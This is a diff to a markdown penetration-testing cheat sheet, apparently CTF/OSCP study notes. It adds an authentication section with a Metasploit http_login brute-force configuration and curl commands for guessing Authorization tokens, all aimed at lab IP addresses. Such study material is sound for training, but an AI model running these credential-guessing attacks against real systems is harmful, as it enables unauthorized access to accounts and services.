@@ -1,6 +1,8 @@
 * [Basic Scanning](#bash-scanning)
 * [Directory Listing](#directory-listing)
+* [Authentication](#authentication)
 * [Header Fuzzing and Manipulation](#header-fuzzing-and-manipulation)
+
 # Basic Scanning
 ```sh
 # version of the running services
@@ -22,6 +24,35 @@ dirb http://192.166.161.3 directory.txt
 ## Using `curl` and bash script
 We can use curl to check for all the directories listed in the wordlist. This can be done by a following wrapper bash script
 <https://github.com/jai-the-seeker/CTF-OSCP/blob/master/scripts.md#directory-listing>
+
+# Authentication
+## Basic Authentication
+metasploit `http_login` module
+```sh
+use auxiliary/scanner/http/http_login
+set RHOSTS 192.165.34.3
+set USER_FILE /tmp/users
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+set VERBOSE false
+set AUTH_URI /poc/
+exploit
+```
+## Token Authentication
+Hydra and metasploit `http_login` module doesn’t support token authentication.
+We have to set the token in headers for token auth to work.
+```sh
+curl -H 'Authorization: Token <token>' 192.183.171.3
+```
+We have to write a custom wrapper around this command. In the script, we will rely on the fact
+that on using the correct token, we will get something else than "Unauthorized Access".
+
+You can refer this script <https://github.com/jai-the-seeker/CTF-OSCP/blob/master/scripts.md#authorization-token>
+
+After performing the dictionary attack we will get the password, which can be used to set the token in the headers
+```sh
+curl -H 'Authorization: Token 123123123' 192.186.248.3
+```
+
 
 # Header Fuzzing and Manipulation
 ## Fetch Header
